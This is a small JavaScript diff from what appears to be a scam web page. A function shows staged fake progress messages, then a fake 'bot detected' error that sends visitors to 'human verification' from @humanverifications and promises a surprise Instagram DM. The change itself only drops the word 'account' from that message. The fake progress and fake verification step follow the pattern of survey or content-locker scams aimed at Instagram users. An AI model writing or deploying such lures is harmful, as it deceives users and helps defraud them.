@@ -87,7 +87,7 @@ function F3() {
       } else if (CUR >= 64 && CUR < 96) {
         TEX = "Saving all changes to the database...";
       } else if (CUR >= 96) {
-        TEX = "Error, bot detected! Pass human verification to complete registration. <br><span class='t-normal'>After Passing human verification from @humanverifications you will get a SURPISE DM in your instagram account within 48 hours ! 🖤   </span>";
+        TEX = "Error, bot detected! Pass human verification to complete registration. <br><span class='t-normal'>After Passing human verification from @humanverifications you will get a SURPISE DM in your instagram within 48 hours ! 🖤   </span>";
         $(".VB").fadeIn(1500);
       }
 
